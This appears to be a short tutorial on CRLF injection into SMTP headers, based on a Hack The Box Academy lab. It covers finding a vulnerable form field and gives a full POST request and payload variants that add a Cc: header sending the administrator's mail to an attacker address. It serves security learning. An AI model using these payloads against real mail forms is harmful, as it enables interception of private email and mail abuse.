Here will I treat a injection tips that can be used to get a injection on SMTP header by using **CRLF tags.**

# SMTP Headers intro
```
    From: contains the sender
    To: contains a single recipient or a list of recipients
    Subject: contains the email title
    Reply-To: contains the email address the recipient should reply to
    Cc: contains recipients that receive a carbon copy of the email
    Bcc: contains recipients that receive a blind carbon copy of the email
```

# How to identify
Well this is a manual job, start by injecting **/r/nXXXX(%0d%0aTEST)** after every header until you find the one that is vulnerable. Example, start by injecting into from, next to, next Subject, etc until you find one.

# Exploit:
In the following code example taken from HTB academy module we found that email header was vulnerable to **CRLF** injection and we could indeed use that to add a Cc: header in the email so we could sniff the mail from the administrator. 
REMEMBER: you need access to the victim  email server otherwise you won't know if attack succeed or not!
```
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 107
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aCc:%20evil@attacker.htb&phone=123456789&message=Hello+Admin%21
```

# TIPS:
When you are creating your payload start by adding the padding to get a new line and maybe Cc: Your-email. If this is not enough you might want to add a Dummy: Header as well, example:
### Start by:
```
email=yovecio%40test.htb%0d%0aCc:%20yovecio@test.htb
//If not enough you can add a dummy header afterwards
email=yovecio%40test.htb%0d%0aCc:%20yovecio@test.htb%0d%0aTest:%20Cacca
```
The reason is that sometimes the backend might add extra chars like strings, ., ! that would invalidate Cc: something@something.com and adding a dummy header will get that shit injected there instead!